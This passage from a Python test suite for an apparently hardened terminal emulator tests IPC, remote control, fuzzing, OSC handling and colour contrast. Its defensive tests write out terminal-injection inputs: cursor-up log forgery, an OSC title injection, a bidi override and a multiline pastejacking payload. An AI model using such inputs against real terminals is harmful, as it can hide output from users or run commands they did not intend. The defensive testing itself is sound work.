   'cli: -- gives a real argv (no shell reparse)')
eq(_pla(['-e', 'ls -la']).tabs[0]['command'], 'ls -la',
   'cli: -e gives a shell-split string')
_lc = _pla(['--class', 'MyTerm', '--name', 'inst'])
eq((_lc.wm_class, _lc.wm_name), ('MyTerm', 'inst'), 'cli: WM class/name parsed')
eq([(t['title'], t['tui']) for t in
    _pla(['--tab', '--title', 'A', '--tab', '--title', 'B', '--tui']).tabs],
   [('A', None), ('B', True)], 'cli: --tab multi-tab, no empty leading tab')
eq(_pla([]).tabs, [], 'cli: bare launch specifies no tabs (normal startup)')
eq(_pla(['--title', 'a', '--tab', '--title', 'b', '--', 'sleep', '9'])
   .tabs[-1]['command'], ['sleep', '9'], 'cli: -- command attaches to last tab')
# robustness: adversarial / malformed argv must never crash uncaught (argparse
# may SystemExit on a bad option, which is correct for a CLI; nothing else raises)
for _argv in ([], ['--'], ['--', '--tab', '--title'], ['--tab'], ['--tab', '--tab'],
              ['--title'], ['--mode', 'bogus'], ['--class'], ['-e'],
              ['--', '-e', '--tab', '--'], ['\x00', '\x1b', '--tab', 'x'],
              ['--tab'] * 50):
    try:
        _r = _pla(_argv)
        ok(isinstance(_r.tabs, list), 'cli: argv %r -> a valid spec' % (_argv[:3],))
    except SystemExit:
        ok(True, 'cli: argv %r rejected cleanly (argparse exit)' % (_argv[:3],))
_lw = MainWindow(launch=_pla(['--title', 'mytab', '--mode', 'reveal',
                              '--', 'sleep', '30']))
pump(150)
eq(_lw.tabs.tabText(0), 'mytab', 'launch: tab title applied')
eq(_lw.current().current_mode(), 'reveal', 'launch: display mode applied')
_lw.close()

# a launch tab APPLIES its per-tab overrides (osc feature + bell channels)
_lo = MainWindow(launch=_pla(['--osc', 'osc_clipboard_read', '--bell', 'visual',
                              '--', 'sleep', '30']))
pump(150)
_lot = _lo.current()
ok(_lot.osc_enabled('osc_clipboard_read'),
   'launch: --osc enables the named OSC feature for that tab only')
eq(_lot.bell_channels(), {'visual'}, 'launch: --bell sets the tab bell channels')
_lo.close()

# an admin lock ALWAYS wins over a CLI per-tab override
_lk = MainWindow(launch=_pla([]))
_lk._locked = frozenset({'osc_clipboard_read', 'bell', 'colors'})
_lk._open_launch_tab({'osc': ['osc_clipboard_read'], 'bell': 'audible',
                      'colors': True, 'command': ['sleep', '30']})
pump(80)
_lkt = _lk.current()
ok(not _lkt.osc_enabled('osc_clipboard_read'),
   'launch: an admin lock overrides a CLI --osc override')
eq(_lkt.bell_channels(), _lk._default_bell,
   'launch: an admin lock overrides a CLI --bell override')
_lk.close()

# an unknown / bogus --osc feature is ignored (never crashes, never enables)
_lb = MainWindow(launch=_pla(['--osc', 'not_a_feature', '--', 'sleep', '30']))
pump(80)
ok(not _lb.current().osc_enabled('not_a_feature'),
   'launch: an unknown --osc feature is ignored')
_lb.close()

# --- single-instance IPC: a running instance opens a client's tabs ------------
import threading                                       # noqa: E402
from secure_terminal.main import _launch_to_request    # noqa: E402
from secure_terminal import ipc as _ipc                # noqa: E402
## C1: Save and restore XDG_RUNTIME_DIR globally mutated in this block
_old_xdg = os.environ.get('XDG_RUNTIME_DIR')
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()     # isolated socket dir
try:
    srvwin = MainWindow(launch=_pla([]))
    srvwin.start_instance_server('default')
    pump(150)
    ok(os.path.exists(_ipc.socket_path('default')), 'ipc: server bound its socket')
    eq(oct(os.stat(_ipc.socket_path('default')).st_mode & 0o777), '0o700',
       'ipc: socket is owner-only (0700)')
    _before = srvwin.tabs.count()
    _res = {}


    def _client():
        spec = _pla(['--title', 'fromclient', '--', 'sleep', '30'])
        _res['reply'] = _ipc.send_request('default', _launch_to_request(spec))


    _th = threading.Thread(target=_client)
    _th.start()
    for _ in range(300):                                   # pump so the server answers
        pump(10)
        if not _th.is_alive():
            break
    ## C2: Add timeout to _th.join() and check is_alive() to prevent unbounded hang
    _th.join(10)
    ok(not _th.is_alive(), 'ipc: client thread terminates')
    eq(_res.get('reply', {}).get('ok'), True, 'ipc: client open request accepted')
    eq(srvwin.tabs.count(), _before + 1, 'ipc: the running instance opened the tab')
    ok(any(srvwin.tabs.tabText(i) == 'fromclient' for i in range(srvwin.tabs.count())),
       'ipc: opened tab carries the client title')
    # a malformed op is refused, not crashed
    eq(srvwin._dispatch_request(b'{"op":"bogus"}').get('ok'), False,
       'ipc: unknown op refused')
    eq(srvwin._dispatch_request(b'not json').get('ok'), False, 'ipc: bad json refused')
    # remote control is OFF here (no admin conf) -> ctl ops refused
    eq(srvwin._dispatch_request(b'{"op":"ctl-ls"}').get('ok'), False,
       'ctl: refused when remote_control is off')
    srvwin.close()
finally:
    if _old_xdg is None:
        os.environ.pop('XDG_RUNTIME_DIR', None)
    else:
        os.environ['XDG_RUNTIME_DIR'] = _old_xdg

# --- remote control (ctl), enabled by a privileged config ---------------------
_rcsys = tempfile.mkdtemp(prefix='st-rcsys-')
with open(os.path.join(_rcsys, '90_rc.conf'), 'w') as _f:
    _f.write('remote_control=true\n')
_o_sys2 = settings._system_dirs
settings._system_dirs = lambda: [_rcsys]
try:
    rcwin = MainWindow(launch=_pla(['--title', 'main']))
    pump(120)
    ok(rcwin._remote_control, 'ctl: privileged remote_control=true enables it')
    _lsr = rcwin._dispatch_request(b'{"op":"ctl-ls"}')
    ok(_lsr.get('ok') and _lsr['tabs'][0]['title'] == 'main', 'ctl: ls lists tabs')
    _t = spy_writes(rcwin.current())
    rcwin.current()._line_dirty = False
    _sr = rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:main","text":"ok\\n"}')
    # Delivered as a PASTE: sanitized, then the TRAILING submit is stripped, so a
    # `send-text $'cmd\n'` injection cannot auto-run cmd at the prompt; it waits
    # there for the user's own Enter. The line is marked unverifiable.
    ok(_sr.get('ok') and _t == [b'ok'],
       'ctl: send-text sanitizes but never auto-submits (no trailing CR)')
    ok(rcwin.current()._line_dirty,
       'ctl: send-text marks the line unverifiable')
    # a control character in send-text is dropped by the sanitizer
    _t2 = spy_writes(rcwin.current())
    rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"id:0","text":"a\\u001bb"}')
    ok(_t2 == [b'ab'], 'ctl: send-text strips an escape (no injection)')
    # A MULTILINE send-text (an embedded newline BEFORE the final byte) would auto-run
    # every line but the last the instant it lands -- the exact pastejacking vector the
    # GUI holds for a forced review. sanitize maps the embedded '\n' to '\r' and
    # paste_no_autosubmit strips only a TRAILING run, so the inner submit survived and
    # ran the first command. The headless ctl path has no user to prompt, so it now
    # REFUSES the payload: the request fails AND not one byte reaches the shell.
    _t3 = spy_writes(rcwin.current())
    _mr = rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"id:0","text":"evil\\nsecond"}')
    ok(not _mr.get('ok') and _t3 == [],
       'ctl: send-text refuses a multiline payload; nothing auto-runs')
    rcwin._dispatch_request(
        b'{"op":"ctl-set-tab-title","tab":"id:0","title":"renamed"}')
    eq(rcwin.tabs.tabText(0), 'renamed', 'ctl: set-tab-title renames the tab')
    eq(rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:nope","text":"x"}').get('ok'), False,
        'ctl: an unmatched tab is an error')
    # dump-tab: read back a tab's current rendered text (for E2E assertions). Do NOT pump
    # between the append and the dump: the tab runs the real login shell, whose prompt
    # arrives asynchronously via the pty, and an event-loop turn here would let that prompt
    # land AFTER 'gamma' and end the document with the prompt instead (a flake seen under
    # coverage's slowdown). transcript_text() flushes any pending paint itself, so the dump
    # sees the appended text with no pump; without a pump no _on_readable can run to insert
    # a late prompt.
    rcwin.current()._append('alpha\nbeta\ngamma')
    _dr = rcwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}')
    ok(_dr.get('ok') and _dr['text'].endswith('gamma'), 'ctl: dump-tab reads the tab text')
    _dr2 = rcwin._dispatch_request(
        b'{"op":"ctl-dump-tab","tab":"id:0","lines":1}')
    eq(_dr2.get('text'), 'gamma', 'ctl: dump-tab --lines returns the tail')
    rcwin.close()
finally:
    settings._system_dirs = _o_sys2

# dump-tab is gated like the other ctl ops
_o_sys3 = settings._system_dirs
settings._system_dirs = lambda: [tempfile.mkdtemp()]      # no remote_control
try:
    offwin = MainWindow(launch=_pla([]))
    pump(60)
    eq(offwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}').get('ok'),
       False, 'ctl: dump-tab refused when remote control is off')
    offwin.close()
finally:
    settings._system_dirs = _o_sys3

# --- cat-over-ssh: sanitization is at the render layer, so the byte SOURCE is
# irrelevant. A malicious file cat'd on a REMOTE host over ssh reaches the local
# terminal as the same pty byte stream a local program would emit, and is
# sanitized the same. We prove it end to end by having a subprocess emit exactly
# what a remote `cat evil-file` would deliver (the git-diffs-lie / Trojan-Source
# bytes) and asserting the rendered document is safe.
import tempfile as _tf2                                  # noqa: E402
_evil = os.path.join(_tf2.mkdtemp(prefix='st-ssh-'), 'cat_evil.sh')
with open(_evil, 'w') as _f:
    # printf writes raw bytes to stdout, exactly as `cat` of a crafted file over
    # ssh would. The cursor-up + erase-line tries to reach the EARLIER line and
    # overwrite it -- the classic log-forgery. \033 is ESC.
    _f.write('#!/bin/sh\n'
             "printf 'SECRET_REAL_OUTPUT\\n'\n"
             "printf '\\033[1A\\033[2KHIDDEN_FAKE\\n'\n"   # up+erase the line above
             "printf '\\033]0;pwned\\007visible-text\\n'\n"  # OSC title injection
             "printf 'admin \\342\\200\\256nimda\\342\\200\\254 bidi\\n'\n"
             'sleep 30\n')
os.chmod(_evil, 0o700)
ssh = SecureTerminal(command=_evil)          # stands in for: ssh host cat evil
ssh.resize(700, 300)
ssh.show()
pump(500)
_doc = ssh.toPlainText()
ok('\x1b' not in _doc, 'ssh/cat: no escape byte survives to the document')
ok('\x9b' not in _doc and '\x07' not in _doc, 'ssh/cat: no C1 / BEL survives')
ok(chr(0x202e) not in _doc, 'ssh/cat: the bidi override is neutralized')
# the cursor-UP is stripped, so the forgery cannot reach the EARLIER line: the
# real output survives (a program can only rewrite its own current line).
ok('SECRET_REAL_OUTPUT' in _doc,
   'ssh/cat: cross-line forgery prevented (cursor-up cannot hide earlier output)')
ok('visible-text' in _doc, 'ssh/cat: honest visible text is shown')
ok('pwned' not in _doc, 'ssh/cat: the OSC-0 title-injection payload is stripped')
ssh.shutdown()

# --- fuzz the Qt-side request parsers (owner-only socket, but still defensive) -
from hypothesis import given as _given, strategies as _hst   # noqa: E402
from hypothesis import settings as _hset                     # noqa: E402
from secure_terminal.main import _sanitize_tab_spec          # noqa: E402
_HRUN = _hset(max_examples=150, deadline=None)


@_HRUN
@_given(_hst.dictionaries(
    _hst.text(max_size=12),
    _hst.one_of(_hst.none(), _hst.text(max_size=32), _hst.booleans(),
                _hst.integers(), _hst.lists(_hst.text(max_size=8), max_size=4))))
def _fuzz_tab_spec(spec):
    out = _sanitize_tab_spec(spec)
    assert set(out) == {'title', 'tui', 'mode', 'command',
                        'colors', 'line_edits', 'bell', 'osc'}
    assert out['title'] is None or isinstance(out['title'], str)
    assert out['tui'] is None or isinstance(out['tui'], bool)
    assert out['mode'] is None or isinstance(out['mode'], str)
    assert out['colors'] is None or isinstance(out['colors'], bool)
    assert out['line_edits'] is None or isinstance(out['line_edits'], bool)
    assert out['bell'] is None or isinstance(out['bell'], str)
    assert out['osc'] is None or (isinstance(out['osc'], list)
                                  and all(isinstance(f, str) for f in out['osc']))


try:
    _fuzz_tab_spec()
    ok(True, 'fuzz: _sanitize_tab_spec validates arbitrary IPC tab specs')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _sanitize_tab_spec raised: %s' % _e)

_fw = MainWindow(launch=_pla([]))


@_HRUN
@_given(_hst.binary(max_size=256))
def _fuzz_dispatch(payload):
    reply = _fw._dispatch_request(payload)
    assert isinstance(reply, dict) and 'ok' in reply


try:
    _fuzz_dispatch()
    ok(True, 'fuzz: _dispatch_request handles arbitrary IPC bytes without crashing')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _dispatch_request raised: %s' % _e)
_fw.close()

# fuzz: the TUI OSC handler must be chunk-boundary invariant -- an OSC fed whole
# vs split at any point must fire the SAME action (the OSC-split-across-reads bug
# class). One reused terminal; reset the OSC carry between the two runs.
_ofz = SecureTerminal(command='/bin/cat', tui=True)
_ofz.apply_osc('osc_notify', True)
_ofz.apply_osc('osc_cwd', True)


@_HRUN
@_given(_hst.text(alphabet=_hst.characters(min_codepoint=32, max_codepoint=126),
                  max_size=48),
        _hst.integers(min_value=0, max_value=52))
def _fuzz_osc_split(body, split):
    seq = b'\x1b]9;' + body.encode('ascii') + b'\x07'
    _ofz._osc_carry = b''
    whole = []
    _cw = _ofz.notified.connect(lambda s: whole.append(s))
    _ofz._handle_osc(seq)
    _ofz.notified.disconnect(_cw)
    _ofz._osc_carry = b''
    parts = []
    _cs = _ofz.notified.connect(lambda s: parts.append(s))
    _ofz._handle_osc(seq[:split])
    _ofz._handle_osc(seq[split:])
    _ofz.notified.disconnect(_cs)
    assert whole == parts


@_HRUN
@_given(_hst.binary(max_size=64))
def _fuzz_osc7_safe(raw):
    # any OSC 7 path emitted to the tab tooltip is fully safe (a percent-decoded
    # bidi/zero-width/control byte can never reach it)
    body = raw.replace(b'\x07', b'').replace(b'\x1b', b'')
    _ofz._osc_carry = b''
    _ofz._reported_cwd = ''
    got = []
    _c = _ofz.cwd_changed.connect(lambda p: got.append(p))
    _ofz._handle_osc(b'\x1b]7;file://h/' + body + b'\x07')
    _ofz.cwd_changed.disconnect(_c)
    for _p in got:
        assert _S.render_output(_p, 'box') == _p    # already safe: nothing to strip


for _name, _prop in (('osc_split', _fuzz_osc_split), ('osc7_safe', _fuzz_osc7_safe)):
    try:
        _prop()
        ok(True, 'fuzz: OSC handler %s invariant holds' % _name)
    except Exception as _e:            # pylint: disable=broad-except
        ok(False, 'fuzz: OSC handler %s: %s' % (_name, _e))
_ofz.close()

# --- adversarial: OSC split-invariance BEYOND OSC 9 + no split-smuggled write --
# An OSC of ANY code fed whole vs split at any offset must have the SAME observable
# effect, crucially the SAME write-backs -- so an attacker cannot smuggle a
# reflection / injection through a chunk boundary. Extends the OSC-9-only notify
# test to title/palette/cwd/hyperlink/clipboard/colour-query codes, and asserts on
# the WRITE spy (the injection-relevant channel), not just a signal.
_osz = SecureTerminal(command='/bin/cat')
_osc_sweep = ('osc_title', 'osc_notify', 'osc_cwd', 'osc_hyperlink', 'osc_clipboard')
for _osf in _osc_sweep:
    _osz.apply_osc(_osf, True)         # each is a real feature -> must enable, not swallow
ok(all(_osz.osc_enabled(_f) for _f in _osc_sweep),
   'every OSC feature enables (no swallowed apply_osc failure weakening the sweep)')


## B1: Enable osc_clipboard_read and grant consent so split-invariance assert is real
_osz._osc['osc_clipboard_read'] = True
_osz._clipboard_read = True


def _osc_writes(seq_parts):
    _osz._osc_carry = b''
    # each feed starts from the SAME state: a granted read with the 1s rate-limit cleared,
    # so a code-52 reply is deterministic -- else whole (which fires first) and split (then
    # rate-limited) differ, and the property flakes across Hypothesis's repeated calls.
    _osz._clipboard_read = True
    _osz._last_clip_read = 0.0
    captured: list[bytes] = []
    _orig = _osz._write
    _osz._write = captured.append      # pylint: disable=protected-access
    try:
        for part in seq_parts:
            _osz._handle_osc(part)
    finally:
        _osz._write = _orig
    return captured


@_HRUN
@_given(_hst.sampled_from((0, 1, 2, 4, 7, 8, 9, 10, 11, 52, 104)),
        _hst.text(alphabet=_hst.characters(min_codepoint=32, max_codepoint=126),
                  max_size=40),
        _hst.integers(min_value=0, max_value=48))
def _prop_osc_split_writeback(code, body, split):
    seq = b'\x1b]' + str(code).encode('ascii') + b';' + body.encode('ascii') + b'\x07'
    whole = _osc_writes([seq])
    parts = _osc_writes([seq[:split], seq[split:]])
    assert whole == parts, 'code=%d split=%d: whole=%r split=%r' % (
        code, split, whole, parts)


try:
    _prop_osc_split_writeback()
    ok(True, 'adversarial: OSC split-invariance holds across codes (no write smuggled '
             'through a chunk boundary)')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'adversarial: OSC split-invariance: %s' % _e)
_osz.close()

# --- adversarial: the contrast guard holds for the WHOLE attacker colour space --
# The guard must keep text readable for ANY program-chosen fg/bg -- a palette index,
# a 256-colour, or a 24-bit truecolour, on either theme -- not just the one
# black-on-dark case. The attacker picks the colours, so the invariant (final fg is
# never near-invisible against its effective bg) must survive every pick.
from secure_terminal.terminal import THEMES as _THEMES, _rgb as _rgb_of  # noqa: E402
from secure_terminal.sanitize import too_close as _too_close             # noqa: E402
from PyQt6.QtGui import QColor as _QColor2                                # noqa: E402

_cg = SecureTerminal(command='/bin/cat')
_cg.apply_colors(True)
_colorval = _hst.one_of(
    _hst.none(),
    _hst.integers(min_value=0, max_value=15),
    _hst.builds(lambda r, g, b: '#%02x%02x%02x' % (r, g, b),
                _hst.integers(0, 255), _hst.integers(0, 255), _hst.integers(0, 255)))


@_HRUN
@_given(_colorval, _colorval, _hst.booleans(), _hst.sampled_from(('dark', 'light')))
def _prop_contrast_guard(fg_i, bg_i, bold, theme):
    _cg.apply_theme(theme)
    fmt = _cg._format_for({'fg': fg_i, 'bg': bg_i, 'bold': bold})
    fg_brush = fmt.foreground()
    if fg_brush.style() == Qt.BrushStyle.NoBrush:
        return                         # nothing coloured -> invariant N/A
    base_bg = _THEMES.get(theme, _THEMES['dark'])[0]
    bg_brush = fmt.background()
    bg = (bg_brush.color() if bg_brush.style() != Qt.BrushStyle.NoBrush
          else _QColor2(base_bg))
    assert not _too_close(_rgb_of(fg_brush.color()), _rgb_of(bg)), (
        'fg=%r bg=%r theme=%s -> unreadable' % (fg_i, bg_i, theme))


try:
    _prop_contrast_guard()
    ok(True, 'adversarial: the contrast guard keeps text readable for ANY program '
             'colours (palette / 256 / truecolour, both themes)')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'adversarial: contrast guard failed: %s' % _e)

# --- exhaustive + deterministic: EVERY ANSI palette combination (line mode) ----
# The hypothesis sweep above samples the truecolour space; this pass ENUMERATES
# the realistic attack surface with no randomness -- each of the 16 ANSI palette
# colours (and the default) as fg against each as bg, bold on and off, on both
# themes -- and asserts the invariant on every single one: the final foreground is
# never near-invisible against its effective background. Deterministic, so a
# regression can never slip through on a lucky seed.
def _eff_pair(fmt, theme):
    _fgb = fmt.foreground()
    if _fgb.style() == Qt.BrushStyle.NoBrush:
        return None
    _base_bg = _THEMES.get(theme, _THEMES['dark'])[0]
    _bgb = fmt.background()
    _bg = (_bgb.color() if _bgb.style() != Qt.BrushStyle.NoBrush
           else _QColor2(_base_bg))
    return _rgb_of(_fgb.color()), _rgb_of(_bg)

_line_checked = 0
_line_bad = []
for _theme in ('dark', 'light'):
    _cg.apply_theme(_theme)
    for _fg in list(range(16)) + [None]:
        for _bg in list(range(16)) + [None]:
            for _bold in (False, True):
                _pair = _eff_pair(
                    _cg._format_for({'fg': _fg, 'bg': _bg, 'bold': _bold}), _theme)
                if _pair is None:
                    continue
                _line_checked += 1
                if _too_close(*_pair):
                    _line_bad.append((_theme, _fg, _bg, _bold))
ok(not _line_bad,
   'contrast(line): every ANSI fg x bg x bold x theme stays readable '
   '(%d combos checked, unreadable: %r)' % (_line_checked, _line_bad[:3]))
## teeth: a regression that made _format_for return None for EVERY combo would leave
## _line_bad empty and pass the sweep vacuously -- so require the sweep actually ran.
ok(_line_checked > 0, 'contrast(line): the sweep exercised combos (not a vacuous 0-combo pass)')

# a program cannot hide text by painting fg == bg for ANY palette index either.
_hide_bad = []
_hide_checked = 0
for _theme in ('dark', 'light'):
    _cg.apply_theme(_theme)
    for _i in range(16):
        _pair = _eff_pair(_cg._format_for({'fg': _i, 'bg': _i, 'bold': False}), _theme)
        if _pair is None:
            continue
        _hide_checked += 1
        if _too_close(*_pair):
            _hide_bad.append((_theme, _i))
ok(not _hide_bad,
   'contrast(line): fg==bg for every palette index is forced readable (bad: %r)' % _hide_bad)
## teeth: an all-NoBrush regression would leave _hide_bad empty and pass vacuously.
ok(_hide_checked > 0, 'contrast(hide): the sweep exercised indices (not a vacuous 0-index pass)')
_cg.close()

# --- configurable window keyboard shortcuts -----------------------------------
# Every window shortcut is registered (documented) and rebindable, with conflict
# detection; only non-default overrides are persisted. Terminal control keys are
# NOT in this registry (they always go to the program).
ok(len(win._shortcuts) >= 14, 'all window shortcuts are registered for the dialog')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'a shortcut has its default binding')
eq(win._set_shortcuts({'new_tab': 'Ctrl+Alt+N'}), [], 'a rebind applies with no conflict')
eq(win.act_new.shortcut().toString(), 'Ctrl+Alt+N', 'the action takes the new binding')
eq(win._keybindings.get('new_tab'), 'Ctrl+Alt+N', 'a non-default binding is stored as an override')
win._set_shortcuts({'new_tab': 'Ctrl+Shift+T'})
ok('new_tab' not in win._keybindings, 'reverting to the default drops the override')
_kc = win._set_shortcuts({'copy': 'Ctrl+Shift+J', 'paste': 'Ctrl+Shift+J'})
ok(bool(_kc), 'two actions on one combination is reported as a conflict')
eq(win.act_copy.shortcut().toString(), 'Ctrl+Shift+C',
   'a conflicting rebind applies nothing (copy keeps its binding)')
# a bare Ctrl+<letter> is reserved for the terminal (Ctrl+U/R reach the program)
ok(bool(win._set_shortcuts({'new_tab': 'Ctrl+U'})),
   'binding a window action to a terminal control key is rejected')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'the reserved rebind applied nothing')
ok(bool(win._set_shortcuts({'new_tab': 'A'})),
   'binding to a bare printable key (which would eat typing) is rejected')
# a built-in default that happens to be Ctrl+<letter> is grandfathered in, so
# only a USER-set bare Ctrl+<letter> is rejected.
eq(win._set_shortcuts({'quit': 'Ctrl+Q', 'new_tab': 'Ctrl+Alt+T'}), [],
   'a default Ctrl+Q and a Ctrl+Alt combo are accepted')
win._set_shortcuts({'new_tab': 'Ctrl+Shift+T'})       # restore default
# an admin lock on keybindings refuses edits entirely
_saved_locked = win._locked
win._locked = set(win._locked) | {'keybindings'}
ok(bool(win._set_shortcuts({'new_tab': 'Ctrl+Alt+Z'})),
   'a locked keybindings setting refuses edits')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'the locked edit applied nothing')
win._locked = _saved_locked

# --- New Tab: CLI vs TUI mode chosen at creation (#69) ------------------------
_saved_dtui = win._default_tui
win._default_tui = False
win.new_tab(tui=False)
ok(win.current()._tui is False, 'new_tab(tui=False) opens a CLI-mode tab')
ok(win.act_new_cli.isEnabled(), 'the New Tab (CLI) action is always available')
win.new_tab(tui=True)
ok(win.current()._tui is True, 'new_tab(tui=True) opens a TUI-mode tab')
ok(win.act_new_tui.isEnabled(), 'New Tab (TUI) is always available')
# the default variant follows the window default, not a forced mode
win._default_tui = False
win.new_tab()
ok(win.current()._tui is False, 'plain new_tab() uses the window default (CLI)')
win._default_tui = _saved_dtui

# an override loaded from config is honoured at build time via _bind()
_kb = MainWindow()
_kb._keybindings = {'close_tab': 'Ctrl+Alt+W'}
from PyQt6.QtGui import QAction as _QAction        # noqa: E402
_probe = _QAction('&Close Tab', _kb)
_kb._bind(_probe, 'close_tab', 'Ctrl+Shift+W')
eq(_probe.shortcut().toString(), 'Ctrl+Alt+W', '_bind applies a config override over the default')
_kb.close()

# --- OSC handler robustness (codex follow-up) --------------------------------
_oh = SecureTerminal(command='/bin/cat', tui=True)
_oh.apply_osc('osc_hyperlink', True)
_oh.apply_osc('osc_notify', True)
_links = []
_oh.notified.connect(lambda s: _links.append(s))
# OSC 8 hyperlink with an ST (ESC \) terminator, not just BEL, must be surfaced
_oh._handle_osc(b'\x1b]8;;https://example.com/a\x1b\\click\x1b]8;;\x1b\\')
ok(any('https://example.com/a' in s for s in _links),
   'OSC 8 hyperlink with an ST terminator is surfaced')
# an OSC split across two reads (a 64KiB clipboard is guaranteed to) is still acted on
_links.clear()
_oh._handle_osc(b'\x1b]9;hello ')                 # incomplete -> held as carry
_oh._handle_osc(b'world\x07')                     # completes it on the next read
ok(any('hello world' in s for s in _links), 'an OSC split across PTY reads is still acted on')
_oh.close()

# OSC 7 cwd: a percent-encoded bidi/zero-width char is sanitized before the tooltip
_o7 = SecureTerminal(command='/bin/cat', tui=True)
_o7.apply_osc('osc_cwd', True)
_paths = []
_o7.cwd_changed.connect(lambda p: _paths.append(p))
_o7._handle_osc(b'\x1b]7;file://host/home/%E2%80%AE/x\x07')     # %E2%80%AE = U+202E RLO
_rlo = chr(0x202E)                                # bidi override, kept out of source
ok(_paths and all(_rlo not in p for p in _paths),
   'OSC 7 percent-decoded path is sanitized (no bidi override reaches the tooltip)')
_o7.close()

# restored history is capped so entering TUI cannot synchronously replay a huge scrollback
_big = SecureTerminal(command='/bin/cat', history='x' * 2_000_000)
ok(len(_big._raw) <= _big._RAW_MAX, 'restored history is capped to _RAW_MAX')
_big.close()

# an alternate-screen flood is bounded (per-read snapshot cap), does not hang
if tui_available():
    _af = SecureTerminal(command='/bin/cat', tui=True)
    _af._make_screen()
    _af._feed_stream(b'\x1b[?1049h\x1b[?1049l' * 1000)         # 2000 transitions
    ok(True, 'an alternate-screen flood returns (bounded) rather than hanging')
    _af.close()

# a legacy allow_title lock also locks the granular title/notify controls
_saved_l = win._locked
win._locked = set(win._locked) | {'allow_title'}
win._osc_defaults['osc_notify'] = False
win.set_osc('osc_notify', True)
ok(not win._osc_defaults['osc_notify'],
   'a legacy allow_title lock refuses granular title/notify edits')
win._locked = _saved_l

# session dump carries the full per-tab OSC map, not just the allow_title boolean
_stabs = win._session_tabs()
ok(_stabs and isinstance(_stabs[0].get('osc'), dict) and 'osc_clipboard' in _stabs[0]['osc'],
   'session persists the full per-tab OSC feature map')

# an explicit granular osc_notify=false survives a restart even with legacy
# allow_title=true present (the fallback must not clobber an explicit value)
_cfgdir = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgdir, exist_ok=True)
_ucfg = os.path.join(_cfgdir, '50_user.conf')
with open(_ucfg, 'w', encoding='utf-8') as _ucfh:
    _ucfh.write('allow_title=true\nosc_title=true\nosc_notify=false\n')
_wd = MainWindow()
ok(_wd._osc_defaults['osc_title'] and not _wd._osc_defaults['osc_notify'],
   'legacy allow_title does not override an explicit granular osc_notify=false')
_wd.close()
os.remove(_ucfg)                                  # restore the empty test config

# --- opt-in restricted CLI terminfo -------------------------------------------
import secure_terminal.terminal as _timod                          # noqa: E402
_tdir = _timod.cli_terminfo_dir()
ok(_tdir and os.path.isfile(os.path.join(_tdir, 's', 'secure-terminal')),
   'the restricted terminfo entry compiles/resolves')
# TERM is per-MODE: CLI advertises the restricted secure-terminal entry (so a
# program lists completions plainly and never draws an in-place menu line mode
# cannot show); TUI advertises xterm-256color (full caps for full-screen apps +
# ssh). The dir is returned in BOTH modes so TERMINFO_DIRS resolves either entry
# across a live switch (apply_tui re-exports TERM without restarting the shell).
_ttc = SecureTerminal(command='/bin/cat')                  # CLI mode (default)
eq(_ttc._child_term(), ('secure-terminal', _tdir),
   'CLI mode advertises the restricted TERM (no completion-menu redraws)')
_ttc.close()
_ttt = SecureTerminal(command='/bin/cat', tui=True)        # TUI mode
_tuiterm, _d = _ttt._child_term()
eq(_tuiterm, 'xterm-256color', 'TUI mode advertises xterm-256color (full caps)')
ok(_d == _tdir, 'TERMINFO_DIRS resolves the restricted entry in both modes')
_ttt.close()
# line_edits=false STRIPS the four line-local ops, so the shell must not be told
# they work: CLI then advertises the -noedit entry, which cancels el/el1/cuf/cuf1/
# cub/hpa. Advertising them would have the shell emit redraws we drop on the floor.
_tne = SecureTerminal(command='/bin/cat', line_edits=False)
eq(_tne._child_term(), ('secure-terminal-noedit', _tdir),
   'CLI mode with line editing off advertises the append-only TERM entry')
_tne.close()
# TUI is unaffected: the confined screen model interprets escapes either way.
_tnt = SecureTerminal(command='/bin/cat', tui=True, line_edits=False)
eq(_tnt._child_term()[0], 'xterm-256color',
   'TUI mode is unaffected by line_edits')
_tnt.close()
# the entry cancels every capability-query cap (no probing) + cursor-addressing +
# alternate screen -- assert at the source of truth (the .ti)
_ti = _timod._terminfo_source()
ok(_ti and os.path.isfile(_ti), 'the terminfo source ships')
with open(_ti, encoding='utf-8') as _tih2:
    _ti_src = _tih2.read()
ok('secure-terminal-noedit|' in _ti_src,
   'the terminfo source declares the append-only entry')
for _cap in ('el@', 'el1@', 'cuf@', 'cuf1@', 'cub@', 'hpa@'):
    ok(_cap in _ti_src.split('secure-terminal-noedit|', 1)[-1],
       'the append-only entry cancels %s' % _cap)
# cub1 is \b, a raw control byte honored in BOTH settings -- cancelling it would
# over-restrict, so it must NOT appear in the cancelled set.
ok('cub1@' not in _ti_src,
   'cub1 (backspace) is never cancelled -- it is honored either way')
with open(_ti, encoding='utf-8') as _tih:
    _ti_txt = _tih.read()
ok(all(cap in _ti_txt for cap in ('u6@', 'u7@', 'u8@', 'u9@', 'RV@',
                                  'cup@', 'smcup@', 'rmcup@', 'clear@')),
   'the entry cancels the query + cursor-addressing + alt-screen caps')

# --- CLASH: the ADVERTISED capability set vs what the renderer actually does ---
# The two entries are a PROMISE to the shell, made over the terminfo protocol, and
# the renderer is what keeps it. The cancel-list greps above are a hand-written
# list, so a capability INHERITED from xterm-16color and never thought about is
# invisible to them. Enumerate the compiled entries instead and hold every
# surviving capability to the renderer's real behaviour, in BOTH line_edits
# states. This is what catches the promise the two features break together.
import subprocess as _sp                                            # noqa: E402
from secure_terminal.sanitize import feed_line_edits as _fle        # noqa: E402
from secure_terminal.sanitize import cells_to_runs as _c2r          # noqa: E402
# ncurses itself does the parameter expansion (via tput), so the bytes checked
# are the bytes a real program emits. Deliberately NOT the curses module: an
# in-process setupterm/tparm segfaults this Qt suite.


def _entry_caps(entry):
